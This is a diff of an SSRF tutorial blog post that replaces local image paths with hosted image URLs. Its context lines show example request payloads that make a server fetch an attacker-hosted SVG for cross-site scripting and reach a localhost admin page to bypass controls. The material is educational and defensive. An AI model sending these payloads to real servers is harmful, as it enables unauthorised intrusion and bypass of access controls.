@@ -3,7 +3,7 @@
 :category: attacks
 :subtitle: Attacking a web server using SSRF
 :tags: security, web, vulnerability, ethical-hacking
-:image: cover.png
+:image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331136/blog/understanding-ssrf/cover_srzscf.webp
 :alt: Blacksmith. Photo by Hannah Gibbs on Unsplash: https://unsplash.com/photos/BINLgyrG_fI
 :description: Here we will see what a Server Side Request Forgery is, how hackers can exploit it, and what are the best ways to protect against this attack.
 :keywords: Web, Security, Vulnerability, Hacking, SSRF, Input Validation, Ethical Hacking, Pentesting
@@ -41,7 +41,7 @@ In a normal use case,
 the vulnerable application works like this:
 
 .normal use case
-image::normal-case.png[normal-case]
+image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/normal-case_olhdmb.webp[normal-case]
 
 . The user requests information from an external server
 through the Web Server. For example,
@@ -58,7 +58,7 @@ in order to get internal resources,
 then the process of the attack is the following:
 
 .ssrf attack
-image::ssrf.png[ssrf-attack]
+image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620331134/blog/understanding-ssrf/ssrf_n3pvyq.webp[ssrf-attack]
 
 . The attacker makes the same request
 but modifies the payload
@@ -237,7 +237,7 @@ product_id=&url=https%3a//owasp.org/&s=OK
 Then it will load the `OWASP` web page on our site:
 
 .ssrf vulnerable
-image::ssrf-vulnerable.png[ssrf-vulnerable]
+image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/ssrf-vulnerable_fmgfou.webp[ssrf-vulnerable]
 
 Now we have several options to work with.
 
@@ -275,7 +275,7 @@ product_id=&url=http%3a//<YOUR_IP>%3a8000/payload.svg&s=OK
 ----
 
 .SSRF to XSS result
-image::xss.png[xss-vulnerable]
+image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/xss_zi2u62.webp[xss-vulnerable]
 
 Bypassing controls::
 
@@ -288,7 +288,7 @@ product_id=&url=http%3A%2F%2F127.0.0.1%2Fcode%2Fadmin.php&s=OK
 ----
 
 .SSRF to admin result
-image::admin.png[control-bypass]
+image::https://res.cloudinary.com/fluid-attacks/image/upload/v1620331135/blog/understanding-ssrf/admin_vqyfda.webp[control-bypass]
 
 If the server had some local HTTP servers
 like a `mongodb` database,
